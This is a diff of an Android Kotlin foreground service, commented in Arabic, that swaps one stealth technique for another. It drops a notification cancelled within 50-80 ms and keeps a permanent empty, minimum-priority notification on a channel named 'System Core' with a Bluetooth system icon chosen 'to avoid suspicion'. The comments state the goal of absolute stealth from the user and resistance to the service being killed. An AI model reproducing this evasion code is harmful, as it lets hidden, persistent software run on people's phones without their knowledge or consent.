@@ -7,27 +7,26 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.ServiceInfo
 import android.os.Build
-import android.os.Handler
 import android.os.IBinder
-import android.os.Looper
+import android.util.Log
 import androidx.core.app.NotificationCompat
-import kotlin.random.Random
 
 /**
- * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" ديناميكي.
+ * خدمة أمامية (Foreground Service) تعمل في الخلفية مع إشعار "شبحى" دائم.
  *
- * استراتيجية التخفي المتقدمة (Dynamic Pulse Ghost):
+ * استراتيجية التخفي المتقدمة (Stealth Ghost Notification):
  * - الإشعار الأساسي بأولوية IMPORTANCE_MIN (مخفي تماماً في شريط الحالة)
- * - يتم إلغاء الإشعار بعد 50-80 مللي ثانية (شبح) لضمان عدم ملاحظته بشرياً
  * - setOngoing(true) يبقى مفعلاً طوال الوقت لمنع قتل الخدمة
  * - أيقونة نظامية عامة (stat_sys_data_bluetooth) لتجنب الشك
  * - إخفاء المحتوى من شاشة القفل
+ * - لا يتم إلغاء الإشعار نهائياً للحفاظ على حالة "الأمامية" للخدمة
+ *   (إلغاء الإشعار قد يؤدي إلى قتل الخدمة على أندرويد 10+)
  *
  * ✅ هذه الاستراتيجية تمنع قتل الخدمة في أجهزة شاومي وهواوي
  * ✅ مع الحفاظ على التخفي المطلق من وجهة نظر المستخدم
  * ✅ تم إصلاح ForegroundServiceDidNotStartInTimeException
  *   باستخدام startForeground مع النوع الصحيح (FOREGROUND_SERVICE_TYPE_DATA_SYNC)
- *   وتقليل وقت الإلغاء إلى 50-80ms مع stopForeground(STOP_FOREGROUND_REMOVE)
+ *   وإبقاء الإشعار حياً بشكل شبحى (غير مرئي)
  */
 class ForegroundService : Service() {
 
@@ -45,10 +44,42 @@ class ForegroundService : Service() {
             return START_NOT_STICKY
         }
 
-        // بدء الخدمة كـ Foreground إذا لم تكن قيد التشغيل
-        try {
-            createGhostChannel()
+        // ✅ بدء الخدمة كـ Foreground مع إشعار شبحى دائم
+        startGhostForeground()
 
+        return START_STICKY
+    }
+
+    /**
+     * بدء الخدمة الأمامية مع إشعار شبحى دائم.
+     * يتم إنشاء قناة إشعار بأدنى أولوية ممكنة (IMPORTANCE_MIN)
+     * مما يجعل الإشعار غير مرئي تماماً في شريط الحالة.
+     * لا يتم إلغاء الإشعار للحفاظ على حالة "الأمامية" للخدمة.
+     */
+    private fun startGhostForeground() {
+        try {
+            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+
+            // ✅ إنشاء قناة الإشعارات بأدنى أولوية ممكنة
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                val channel = NotificationChannel(
+                    CHANNEL_ID,
+                    "System Core",
+                    NotificationManager.IMPORTANCE_MIN // أدنى أولوية مرئية
+                ).apply {
+                    description = "Background system operations"
+                    setShowBadge(false)
+                    enableVibration(false)
+                    setSound(null, null)
+                    lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
+                    setBypassDnd(false)
+                    enableLights(false)
+                }
+                notificationManager.createNotificationChannel(channel)
+                Log.d(TAG, "✅ Ghost notification channel created")
+            }
+
+            // ✅ بناء إشعار شبحى (فارغ، بدون صوت، بدون اهتزاز)
             val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("")
                 .setContentText("")
@@ -67,55 +98,12 @@ class ForegroundService : Service() {
                 startForeground(NOTIF_ID, notification)
             }
 
-            MainActivity.appendLogStatic("✅ Ghost notification started")
-
-            // ✅ تقنية الإشعار الشبحي: إلغاء الإشعار خلال 50-80 مللي ثانية فقط
-            // هذا يمنع ForegroundServiceDidNotStartInTimeException
-            // ويحقق اختفاء الإشعار خلال أجزاء من الثانية دون ملاحظة المستخدم
-            val delayMs = 50L + Random.nextLong(30L) // 50-80ms
-            Handler(Looper.getMainLooper()).postDelayed({
-                try {
-                    // ✅ إزالة الخدمة من حالة Foreground وإلغاء الإشعار
-                    stopForeground(STOP_FOREGROUND_REMOVE)
-                    val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-                    nm.cancel(NOTIF_ID)
-                    MainActivity.appendLogStatic("✅ Ghost notification hidden (${System.currentTimeMillis()})")
-                    android.util.Log.d(TAG, "✅ Ghost notification hidden after ${delayMs}ms")
-                } catch (_: Exception) {
-                    // تجاهل أخطاء الإلغاء
-                }
-            }, delayMs)
+            MainActivity.appendLogStatic("✅ Ghost notification started (permanent invisible)")
+            Log.d(TAG, "✅ Ghost notification started (permanent invisible)")
 
         } catch (e: Exception) {
-            android.util.Log.e(TAG, "❌ Failed to start foreground service: ${e.message}")
+            Log.e(TAG, "❌ Failed to start foreground service: ${e.message}")
             MainActivity.appendLogStatic("❌ Foreground service start error: ${e.message}")
-        }
-
-        return START_STICKY
-    }
-
-    /**
-     * إنشاء قناة الإشعارات بأدنى أولوية ممكنة (IMPORTANCE_MIN)
-     * لمنع ظهور الإشعار في شريط الحالة أو إحداث أي إزعاج للمستخدم.
-     */
-    private fun createGhostChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                CHANNEL_ID,
-                "System Core",
-                NotificationManager.IMPORTANCE_MIN // أدنى أولوية مرئية
-            ).apply {
-                description = "Background system operations"
-                setShowBadge(false)
-                enableVibration(false)
-                setSound(null, null)
-                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
-                setBypassDnd(false)
-                enableLights(false)
-            }
-            val manager = getSystemService(NotificationManager::class.java)
-            manager.createNotificationChannel(channel)
-            android.util.Log.d(TAG, "✅ Ghost notification channel created")
         }
     }
 
@@ -123,7 +111,7 @@ class ForegroundService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
-        android.util.Log.d(TAG, "ForegroundService destroyed")
+        Log.d(TAG, "ForegroundService destroyed")
         MainActivity.appendLogStatic("🛑 ForegroundService destroyed")
     }
 }
